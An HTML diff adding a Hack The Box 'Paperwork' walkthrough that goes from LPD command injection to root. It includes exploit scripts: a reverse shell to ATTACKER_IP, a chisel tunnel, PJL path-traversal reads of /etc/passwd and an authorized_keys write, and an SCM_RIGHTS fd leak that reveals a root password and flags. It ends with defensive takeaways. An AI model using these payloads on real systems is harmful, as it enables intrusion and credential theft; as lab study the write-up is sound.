@@ -1,0 +1,687 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Paperwork — Full Walkthrough</title>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #0c0e12;
+            --surface: #13161c;
+            --surface-raised: #1a1e26;
+            --border: #262b36;
+            --text: #c8cdd6;
+            --text-muted: #6b7280;
+            --heading: #e8ecf2;
+            --accent: #4ade80;
+            --accent-dim: #166534;
+            --red: #f87171;
+            --amber: #fbbf24;
+            --blue: #60a5fa;
+            --purple: #c084fc;
+            --cyan: #22d3ee;
+            --code-bg: #0a0c10;
+            --phase-initial: #4ade80;
+            --phase-lateral: #60a5fa;
+            --phase-root: #f87171;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Inter', -apple-system, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.7;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* ─── Header ─── */
+        .hero {
+            border-bottom: 1px solid var(--border);
+            padding: 4rem 2rem 3rem;
+            position: relative;
+            overflow: hidden;
+        }
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, var(--phase-initial), var(--phase-lateral), var(--phase-root));
+        }
+        .hero-inner {
+            max-width: 860px;
+            margin: 0 auto;
+        }
+        .hero-label {
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 0.75rem;
+            letter-spacing: 0.12em;
+            text-transform: uppercase;
+            color: var(--accent);
+            margin-bottom: 1rem;
+        }
+        .hero h1 {
+            font-size: 2.8rem;
+            font-weight: 700;
+            color: var(--heading);
+            letter-spacing: -0.03em;
+            line-height: 1.15;
+        }
+        .hero h1 span { color: var(--accent); }
+        .hero-meta {
+            margin-top: 1.2rem;
+            display: flex;
+            gap: 2rem;
+            flex-wrap: wrap;
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 0.8rem;
+            color: var(--text-muted);
+        }
+        .hero-meta strong { color: var(--text); font-weight: 500; }
+
+        /* ─── Attack chain strip ─── */
+        .chain {
+            background: var(--surface);
+            border-bottom: 1px solid var(--border);
+            padding: 1.5rem 2rem;
+            overflow-x: auto;
+        }
+        .chain-inner {
+            max-width: 860px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            gap: 0;
+            white-space: nowrap;
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 0.78rem;
+        }
+        .chain-node {
+            padding: 0.4rem 0.9rem;
+            border-radius: 4px;
+            font-weight: 500;
+        }
+        .chain-node.green { background: var(--accent-dim); color: var(--accent); }
+        .chain-node.blue { background: #1e3a5f; color: var(--blue); }
+        .chain-node.red { background: #5f1e1e; color: var(--red); }
+        .chain-arrow {
+            color: var(--text-muted);
+            padding: 0 0.5rem;
+            font-size: 0.9rem;
+        }
+
+        /* ─── Main content ─── */
+        .content {
+            max-width: 860px;
+            margin: 0 auto;
+            padding: 3rem 2rem 6rem;
+        }
+
+        /* ─── Phase headers ─── */
+        .phase {
+            margin-top: 3.5rem;
+            margin-bottom: 2rem;
+            padding-bottom: 0.8rem;
+            border-bottom: 1px solid var(--border);
+            position: relative;
+        }
+        .phase:first-child { margin-top: 0; }
+        .phase-number {
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 0.7rem;
+            letter-spacing: 0.15em;
+            text-transform: uppercase;
+            margin-bottom: 0.3rem;
+        }
+        .phase-number.green { color: var(--accent); }
+        .phase-number.blue { color: var(--blue); }
+        .phase-number.red { color: var(--red); }
+        .phase h2 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: var(--heading);
+            letter-spacing: -0.02em;
+        }
+
+        /* ─── Sections ─── */
+        h3 {
+            font-size: 1.15rem;
+            font-weight: 600;
+            color: var(--heading);
+            margin-top: 2.2rem;
+            margin-bottom: 0.8rem;
+        }
+
+        p {
+            margin-bottom: 1rem;
+            color: var(--text);
+        }
+
+        /* ─── Code blocks ─── */
+        pre {
+            background: var(--code-bg);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 1.2rem 1.4rem;
+            overflow-x: auto;
+            margin: 1rem 0 1.4rem;
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 0.82rem;
+            line-height: 1.65;
+            color: var(--text);
+        }
+        pre .comment { color: var(--text-muted); }
+        pre .cmd { color: var(--accent); }
+        pre .output { color: #8b949e; }
+        pre .highlight { color: var(--amber); }
+        pre .important { color: var(--red); }
+
+        code {
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 0.88em;
+            background: var(--surface-raised);
+            padding: 0.15em 0.4em;
+            border-radius: 3px;
+            color: var(--cyan);
+        }
+        pre code {
+            background: none;
+            padding: 0;
+            color: inherit;
+        }
+
+        /* ─── Callout boxes ─── */
+        .callout {
+            border-radius: 6px;
+            padding: 1rem 1.2rem;
+            margin: 1.2rem 0;
+            font-size: 0.92rem;
+            line-height: 1.6;
+        }
+        .callout-why {
+            background: #1a1e26;
+            border-left: 3px solid var(--blue);
+        }
+        .callout-why .callout-label { color: var(--blue); }
+        .callout-warn {
+            background: #1e1a12;
+            border-left: 3px solid var(--amber);
+        }
+        .callout-warn .callout-label { color: var(--amber); }
+        .callout-key {
+            background: #1a1220;
+            border-left: 3px solid var(--purple);
+        }
+        .callout-key .callout-label { color: var(--purple); }
+        .callout-label {
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 0.72rem;
+            font-weight: 600;
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+            display: block;
+            margin-bottom: 0.3rem;
+        }
+
+        /* ─── Python script blocks ─── */
+        .script-title {
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            background: var(--surface-raised);
+            display: inline-block;
+            padding: 0.25rem 0.7rem;
+            border-radius: 4px 4px 0 0;
+            border: 1px solid var(--border);
+            border-bottom: none;
+            margin-bottom: -1px;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* ─── Diagram ─── */
+        .diagram {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 2rem;
+            margin: 1.5rem 0;
+            text-align: center;
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 0.82rem;
+            line-height: 2;
+            color: var(--text);
+            overflow-x: auto;
+        }
+        .diagram .node {
+            display: inline-block;
+            padding: 0.3rem 0.8rem;
+            border-radius: 4px;
+            margin: 0.2rem 0;
+        }
+        .diagram .node-green { background: var(--accent-dim); color: var(--accent); }
+        .diagram .node-blue { background: #1e3a5f; color: var(--blue); }
+        .diagram .node-red { background: #5f1e1e; color: var(--red); }
+        .diagram .arrow { color: var(--text-muted); margin: 0 0.3rem; }
+
+        /* ─── Takeaways ─── */
+        .takeaway {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 1.5rem;
+            margin: 2rem 0;
+        }
+        .takeaway h3 { margin-top: 0; }
+        .takeaway p { margin-bottom: 0.6rem; }
+        .takeaway p:last-child { margin-bottom: 0; }
+        .takeaway-item {
+            padding: 0.5rem 0;
+            border-bottom: 1px solid var(--border);
+        }
+        .takeaway-item:last-child { border-bottom: none; }
+        .takeaway-item strong { color: var(--heading); }
+
+        /* ─── Footer ─── */
+        .footer {
+            text-align: center;
+            padding: 2rem;
+            font-family: 'IBM Plex Mono', monospace;
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            border-top: 1px solid var(--border);
+            margin-top: 4rem;
+        }
+
+        /* ─── Responsive ─── */
+        @media (max-width: 640px) {
+            .hero h1 { font-size: 1.8rem; }
+            .hero-meta { flex-direction: column; gap: 0.5rem; }
+            .content { padding: 2rem 1rem 4rem; }
+            pre { font-size: 0.75rem; padding: 1rem; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- Password Gate -->
+<div id="gate" style="position:fixed;inset:0;z-index:9999;background:var(--bg);display:flex;align-items:center;justify-content:center;">
+    <div style="text-align:center;font-family:'IBM Plex Mono',monospace;">
+        <img src="paperwork-badge.png" alt="Paperwork" style="width:120px;height:120px;border-radius:50%;margin-bottom:1rem;border:2px solid var(--border);">
+        <div style="font-size:0.72rem;letter-spacing:0.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1.2rem;">HTB Writeup — Restricted</div>
+        <div style="color:var(--text-muted);font-size:0.85rem;margin-bottom:1.5rem;max-width:320px;line-height:1.6;">This writeup contains spoilers for an active HTB machine.<br>Enter the password to continue.</div>
+        <input id="gate-pw" type="password" placeholder="Password" autofocus
+            style="background:var(--surface);border:1px solid var(--border);color:var(--heading);padding:0.6rem 1rem;border-radius:4px;font-family:inherit;font-size:0.9rem;width:220px;text-align:center;outline:none;"
+            onkeydown="if(event.key==='Enter')checkPw()">
+        <br>
+        <button onclick="checkPw()"
+            style="margin-top:0.8rem;background:var(--accent-dim);color:var(--accent);border:1px solid var(--accent);padding:0.5rem 1.8rem;border-radius:4px;font-family:inherit;font-size:0.82rem;cursor:pointer;letter-spacing:0.05em;">
+            Enter
+        </button>
+        <div id="gate-err" style="color:var(--red);font-size:0.78rem;margin-top:0.8rem;visibility:hidden;">Incorrect password</div>
+        <div style="color:var(--text-muted);font-size:0.7rem;margin-top:2rem;opacity:0.4;font-style:italic;direction:rtl;unicode-bidi:bidi-override;">Tessera est nomen machinae</div>
+    </div>
+</div>
+<script>
+function checkPw(){
+    if(document.getElementById('gate-pw').value==='paperwork'){
+        document.getElementById('gate').style.display='none';
+        sessionStorage.setItem('htb-auth','1');
+    } else {
+        document.getElementById('gate-err').style.visibility='visible';
+        document.getElementById('gate-pw').value='';
+    }
+}
+if(sessionStorage.getItem('htb-auth')==='1') document.getElementById('gate').style.display='none';
+</script>
+
+<header class="hero">
+    <div class="hero-inner">
+        <div style="display:flex;align-items:center;gap:1.5rem;">
+            <img src="paperwork-badge.png" alt="Paperwork" style="width:80px;height:80px;border-radius:50%;border:2px solid var(--border);">
+            <div>
+                <div class="hero-label">Hack The Box — Walkthrough</div>
+                <h1><span>Paperwork</span></h1>
+            </div>
+        </div>
+        <div class="hero-meta" style="margin-top:1.2rem;">
+            <span>OS <strong>Linux</strong></span>
+            <span>Difficulty <strong>Easy</strong></span>
+            <span>Ports <strong>22 · 80 · 1515</strong></span>
+            <span>Author <strong>Senchuan</strong></span>
+        </div>
+    </div>
+</header>
+
+<div class="chain">
+    <div class="chain-inner">
+        <span class="chain-node green">LPD Command Injection → lp shell</span>
+        <span class="chain-arrow">→</span>
+        <span class="chain-node blue">PJL Path Traversal → archivist</span>
+        <span class="chain-arrow">→</span>
+        <span class="chain-node red">SCM_RIGHTS fd Leak → root</span>
+    </div>
+</div>
+
+<main class="content">
+
+    <!-- ════════════════════════════════════════════ -->
+    <div class="phase">
+        <div class="phase-number green">Phase 0</div>
+        <h2>Reconnaissance</h2>
+    </div>
+
+    <h3>Nmap</h3>
+    <pre><code><span class="cmd">$ sudo nmap -sCV -p- -T4 10.129.29.171</span>
+<span class="output">PORT     STATE SERVICE        VERSION
+22/tcp   open  ssh            OpenSSH 10.0p2 Ubuntu
+80/tcp   open  http           nginx 1.28.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://paperwork.htb/
+1515/tcp open  ifor-protocol?
+|   fingerprint-strings:
+|     TerminalServer, TerminalServerCookie:
+|_      Archive_Printer is ready and printing.</span></code></pre>
+
+    <p>Three ports open. Port 80 redirects to <code>paperwork.htb</code> — add it to <code>/etc/hosts</code>. Port 1515 returns a printer-related banner, suggesting an LPD (Line Printer Daemon) service.</p>
+
+    <h3>Web Enumeration</h3>
+    <p>The web page at <code>http://paperwork.htb</code> is a static "Intake Portal" page for a document archiving service. Two critical pieces of information are visible on the page:</p>
+    <pre><code><span class="highlight">Target Queue:        archive_intake</span>
+<span class="highlight">Internal Processor:  paperwork-archive-v1.02</span>  (downloadable)</code></pre>
+
+    <p>Downloading the archive gives us <code>server.py</code> — the source code of the LPD service running on port 1515.</p>
+
+
+    <!-- ════════════════════════════════════════════ -->
+    <div class="phase">
+        <div class="phase-number green">Phase 1</div>
+        <h2>Initial Access — LPD Command Injection</h2>
+    </div>
+
+    <h3>Vulnerability Analysis</h3>
+    <p>In <code>server.py</code>, the <code>handle_print_job()</code> method processes incoming LPD print jobs. The <code>J</code> field from the control file (the "job name") is interpolated directly into a shell command with no sanitization:</p>
+    <pre><code><span class="comment"># server.py — vulnerable line</span>
+subprocess.Popen(
+    f"echo 'Archive: <span class="important">{job_name}</span>' >> /tmp/archive.log",
+    <span class="important">shell=True</span>
+)</code></pre>
+
+    <div class="callout callout-why">
+        <span class="callout-label">Why this is exploitable</span>
+        <code>shell=True</code> passes the entire string to <code>/bin/sh -c</code>, which interprets shell metacharacters. By injecting <code>'; command #</code> into <code>job_name</code>, we close the echo's single quote, terminate it with <code>;</code>, execute our command, and comment out the rest with <code>#</code>.
+    </div>
+
+    <h3>Exploit</h3>
+    <p>The LPD protocol (RFC 1179) uses a simple binary format. A print job submission starts with command byte <code>0x02</code> followed by the queue name. After the server acknowledges, we send a control file containing the malicious <code>J</code> field.</p>
+
+    <div class="script-title">exploit.py</div>
+    <pre><code>import socket
+
+s = socket.socket()
+s.connect(("TARGET_IP", 1515))
+
+<span class="comment"># Send print job request for "archive_intake" queue</span>
+s.send(b'\x02archive_intake\n')
+r = s.recv(1)                       <span class="comment"># \x00 = accepted</span>
+print(f"Queue: {r}")
+
+if r == b'\x00':
+    <span class="comment"># Inject reverse shell into the J (job name) field</span>
+    cmd = "'; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1' #"
+    control = f"Hattacker\nJ{cmd}\n"
+    header = f"\x02{len(control)} cfA001attacker\n".encode()
+    s.send(header)
+    s.recv(1)
+    s.send(control.encode() + b'\x00')
+    s.recv(1)
+s.close()</code></pre>
+
+    <pre><code><span class="comment"># Terminal 1 — listener</span>
+<span class="cmd">$ nc -lvnp 9001</span>
+
+<span class="comment"># Terminal 2 — fire exploit</span>
+<span class="cmd">$ python3 exploit.py</span>
+<span class="output">Queue: b'\x00'</span>
+
+<span class="comment"># Shell received as lp (uid=7)</span>
+<span class="output">lp@paperwork:/$</span></code></pre>
+
+
+    <!-- ════════════════════════════════════════════ -->
+    <div class="phase">
+        <div class="phase-number blue">Phase 2</div>
+        <h2>Lateral Movement — lp → archivist (PJL Path Traversal)</h2>
+    </div>
+
+    <h3>Internal Enumeration</h3>
+    <p>Checking running processes reveals a JetDirect service bound to <code>127.0.0.1:9100</code>, running as <code>archivist</code>:</p>
+    <pre><code><span class="cmd">$ ps aux | grep jet</span>
+<span class="output">archivi+  985  /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100
+                /home/archivist/printer/ /home/archivist/printer/logs/commands.log</span></code></pre>
+
+    <p>Port 9100 is only accessible from localhost, so we use <a href="https://github.com/jpillora/chisel" style="color: var(--blue);">chisel</a> to tunnel it to the attacker machine:</p>
+    <pre><code><span class="comment"># Attacker</span>
+<span class="cmd">$ ./chisel server -p 9999 --reverse</span>
+
+<span class="comment"># Target (as lp)</span>
+<span class="cmd">$ ./chisel client ATTACKER_IP:9999 R:9100:127.0.0.1:9100</span></code></pre>
+
+    <h3>PJL Protocol Exploration</h3>
+    <p>PJL (Printer Job Language) is a protocol used by HP printers. The JetDirect service implements several PJL filesystem commands. The key vulnerability is in the <code>Filesystem._translate()</code> method:</p>
+    <pre><code>def _translate(self, path):
+    clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
+    return os.path.normpath(os.path.join(self._root, clean))</code></pre>
+
+    <div class="callout callout-why">
+        <span class="callout-label">Why this is exploitable</span>
+        The method strips <code>0:</code> prefixes and converts backslashes, but <strong>never rejects <code>..</code> traversal sequences</strong>. <code>os.path.normpath()</code> resolves <code>..</code> but doesn't enforce that the result stays within the root directory. A path like <code>0:/../../../etc/passwd</code> escapes the printer's root and reads arbitrary files as <code>archivist</code>.
+    </div>
+
+    <h3>Confirm Path Traversal with FSUPLOAD</h3>
+    <div class="script-title">read_file.py</div>
+    <pre><code>import socket, time
+
+path = '0:/../../../etc/passwd'
+payload = (
+    f'\x1b%-12345X@PJL FSUPLOAD NAME="{path}" '
+    f'OFFSET=0 SIZE=4096\r\n\x1b%-12345X'
+)
+
+s = socket.socket()
+s.connect(('127.0.0.1', 9100))
+s.send(payload.encode())
+time.sleep(2)
+s.settimeout(3)
+try:
+    r = s.recv(4096)
+    print(r.decode(errors='ignore'))
+except:
+    print("timeout")
+s.close()</code></pre>
+
+    <pre><code><span class="cmd">$ python3 read_file.py</span>
+<span class="output">@PJL FSUPLOAD NAME="0:/../../../etc/passwd" SIZE=1672
+root:x:0:0:root:/root:/bin/bash
+...
+archivist:x:1000:1000:archivist:/home/archivist:/bin/bash</span></code></pre>
+
+    <h3>Write SSH Key via FSDOWNLOAD</h3>
+    <p>Since the traversal also works for writes, we generate an SSH keypair and inject the public key into archivist's <code>authorized_keys</code>:</p>
+
+    <pre><code><span class="comment"># Generate SSH keypair</span>
+<span class="cmd">$ ssh-keygen -f paperwork_key -N ''</span></code></pre>
+
+    <p>First, create the <code>.ssh</code> directory:</p>
+    <div class="script-title">mkdir_ssh.py</div>
+    <pre><code>import socket, time
+
+path = '0:/../../../home/archivist/.ssh'
+payload = f'\x1b%-12345X@PJL FSMKDIR NAME="{path}"\r\n\x1b%-12345X'
+
+s = socket.socket()
+s.connect(('127.0.0.1', 9100))
+s.send(payload.encode())
+time.sleep(2)
+s.settimeout(3)
+try:
+    r = s.recv(4096)
+    print(repr(r))    <span class="comment"># b'OK\r\n'</span>
+except:
+    print("no response")
+s.close()</code></pre>
+
+    <p>Then write the public key:</p>
+    <div class="script-title">write_key.py</div>
+    <pre><code>import socket, time
+
+pubkey = "ssh-ed25519 AAAA...your_key_here... user@host\n"
+
+path = '0:/../../../home/archivist/.ssh/authorized_keys'
+size = len(pubkey)
+payload = (
+    f'\x1b%-12345X@PJL FSDOWNLOAD FORMAT:BINARY '
+    f'NAME="{path}" SIZE={size}\r\n{pubkey}\x1b%-12345X'
+)
+
+s = socket.socket()
+s.connect(('127.0.0.1', 9100))
+s.send(payload.encode())
+time.sleep(2)
+s.settimeout(3)
+try:
+    r = s.recv(4096)
+    print(repr(r))
+except:
+    print("no response (might be ok)")
+s.close()</code></pre>
+
+    <pre><code><span class="cmd">$ ssh -i paperwork_key archivist@paperwork.htb</span>
+<span class="output">archivist@paperwork:~$ cat user.txt
+5ed4153b64a5c88d6c2c60aa0d360c68</span></code></pre>
+
+
+    <!-- ════════════════════════════════════════════ -->
+    <div class="phase">
+        <div class="phase-number red">Phase 3</div>
+        <h2>Privilege Escalation — archivist → root (SCM_RIGHTS fd Leak)</h2>
+    </div>
+
+    <h3>Understanding paperwork-daemon</h3>
+    <p>A custom daemon at <code>/usr/bin/paperwork-daemon</code> runs as <strong>root</strong> and listens on a Unix socket at <code>/run/paperwork/mgmt.sock</code> (accessible to archivist, uid 1000).</p>
+    <pre><code><span class="cmd">$ cat /etc/systemd/system/paperwork.service</span>
+<span class="output">[Service]
+ExecStart=/usr/bin/python3 /usr/bin/paperwork-daemon
+User=root
+Group=root</span></code></pre>
+
+    <p>At startup, the daemon opens <code>/etc/paperwork/admin_pins.conf</code> (readable only by root) and keeps the file descriptor alive for the entire process lifetime:</p>
+    <pre><code><span class="comment"># paperwork-daemon — startup</span>
+admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)</code></pre>
+
+    <h3>The Trigger Mechanism</h3>
+    <p>On each client connection, the daemon reads <code>commands.log</code> and checks for suspicious PJL commands:</p>
+    <pre><code>def scan_for_malice():
+    with open(LOG_PATH, 'r') as f:
+        content = f.read().upper()
+        if any(trigger in content for trigger in
+               [<span class="important">"FSQUERY"</span>, <span class="important">"FSUPLOAD"</span>, <span class="important">"FSDOWNLOAD"</span>]):
+            return True
+    return False</code></pre>
+
+    <p>If triggered, it sends both file descriptors (the log and the admin config) to the client via <code>SCM_RIGHTS</code> ancillary data:</p>
+    <pre><code>def trigger_lockdown(conn):
+    evidence_bundle = array.array("i", [log_fd, <span class="important">admin_fd</span>])
+    conn.sendmsg(
+        [msg],
+        [(socket.SOL_SOCKET, <span class="important">socket.SCM_RIGHTS</span>, evidence_bundle)]
+    )</code></pre>
+
+    <div class="callout callout-key">
+        <span class="callout-label">Key Concept — SCM_RIGHTS</span>
+        <code>SCM_RIGHTS</code> is a Unix mechanism for passing open file descriptors between processes over a Unix domain socket. The critical detail: once a file descriptor is transferred, the receiving process inherits the <strong>access rights of the opener</strong> — not its own. Since root opened <code>admin_pins.conf</code>, the fd we receive lets us read the file even though archivist has no filesystem permission to do so. The access bypasses on-disk file permissions entirely.
+    </div>
+
+    <h3>Exploit</h3>
+    <p>Step 1: Poison the log file with a trigger word. As archivist, we have write access to <code>commands.log</code>:</p>
+    <pre><code><span class="cmd">$ echo "FSUPLOAD" >> /home/archivist/printer/logs/commands.log</span></code></pre>
+
+    <p>Step 2: Connect to the socket and receive the leaked fd:</p>
+    <div class="script-title">leak_fd.py</div>
+    <pre><code>import socket, array, os
+
+s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.connect('/run/paperwork/mgmt.sock')
+
+<span class="comment"># Receive message + ancillary data containing file descriptors</span>
+msg, ancdata, flags, addr = s.recvmsg(1024, socket.CMSG_SPACE(8))
+print("Message:", msg)
+
+for cmsg_level, cmsg_type, cmsg_data in ancdata:
+    if (cmsg_level == socket.SOL_SOCKET and
+        cmsg_type == socket.SCM_RIGHTS):
+        fds = array.array("i")
+        fds.frombytes(cmsg_data)
+        for fd in fds:
+            data = os.pread(fd, 1024, 0)
+            print(f"FD {fd}: {data.decode()}")
+
+s.close()</code></pre>
+
+    <pre><code><span class="cmd">$ python3 leak_fd.py</span>
+<span class="output">Message: b'ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.'
+FD 4: [... commands.log contents ...]
+FD 5: <span class="important">ADMIN_PASSWORD=ApparelMortuaryCedar22</span></span></code></pre>
+
+    <pre><code><span class="cmd">$ su root</span>
+<span class="output">Password: ApparelMortuaryCedar22</span>
+
+<span class="cmd">root@paperwork:~# cat root.txt</span>
+<span class="output">0925432ddf04627da95a6432b7944f81</span></code></pre>
+
+
+    <!-- ════════════════════════════════════════════ -->
+    <div class="phase">
+        <div class="phase-number" style="color: var(--purple);">Appendix</div>
+        <h2>Key Takeaways</h2>
+    </div>
+
+    <div class="takeaway">
+        <div class="takeaway-item">
+            <strong>Never use <code>shell=True</code> with untrusted input.</strong>
+            <p>The LPD server's use of <code>subprocess.Popen(f"...{job_name}...", shell=True)</code> directly enabled RCE. Use <code>subprocess.run(["echo", job_name])</code> with a list of arguments instead — the shell never interprets metacharacters that way.</p>
+        </div>
+        <div class="takeaway-item">
+            <strong>Path normalization is not path validation.</strong>
+            <p><code>os.path.normpath()</code> resolves <code>..</code> components but does not check whether the result stays inside a designated root. Always verify the resolved path starts with your root directory: <code>assert resolved.startswith(root)</code>.</p>
+        </div>
+        <div class="takeaway-item">
+            <strong><code>SCM_RIGHTS</code> transfers access, not just a reference.</strong>
+            <p>Once a file descriptor is passed over a Unix socket, the receiver can read/write it using the original opener's permissions. A root process that holds sensitive fds should never pass them to unprivileged clients. This is a design flaw — the daemon was intended to share forensic evidence, but it leaked the admin credential fd along with it.</p>
+        </div>
+        <div class="takeaway-item">
+            <strong>Internal services need the same security posture as external ones.</strong>
+            <p>The JetDirect service was bound to <code>127.0.0.1</code> and wasn't directly exposed, but once an attacker gets any foothold (even a low-privilege <code>lp</code> shell), internal services become directly reachable. "Internal only" is not a security boundary.</p>
+        </div>
+    </div>
+
+    <div class="diagram">
+        <span class="node node-green">Attacker</span>
+        <span class="arrow">—LPD injection→</span>
+        <span class="node node-green">lp shell</span>
+        <span class="arrow">—PJL traversal→</span>
+        <span class="node node-blue">archivist (SSH)</span>
+        <span class="arrow">—SCM_RIGHTS leak→</span>
+        <span class="node node-red">root</span>
+    </div>
+
+</main>
+
+<footer class="footer">
+    Senchuan · HTB Paperwork Writeup · 2026
+</footer>
+
+</body>
+</html>
